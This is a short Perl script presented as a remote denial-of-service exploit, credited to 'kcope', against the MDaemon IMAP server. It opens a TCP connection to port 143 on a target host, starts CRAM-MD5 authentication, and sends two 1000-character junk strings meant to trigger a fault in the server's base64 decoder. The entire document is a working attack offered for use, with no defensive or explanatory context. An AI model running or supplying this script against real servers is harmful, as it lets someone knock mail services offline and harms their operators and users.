###
### MDAEMON remote DoS exploit by kcope
### looks like there?s a fault in the base64 decoder
### works also for AUTHENTICATE LOGIN
###

use IO::Socket::INET;

$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                             PeerPort => '143',
                             Proto    => 'tcp');

$a = "q" x 1000;

print $sock "a001 AUTHENTICATE CRAM-MD5\r\n";
print $sock $a,"\r\n";
print $sock $a,"\r\n";

while (<$sock>) {
   print $_;
}

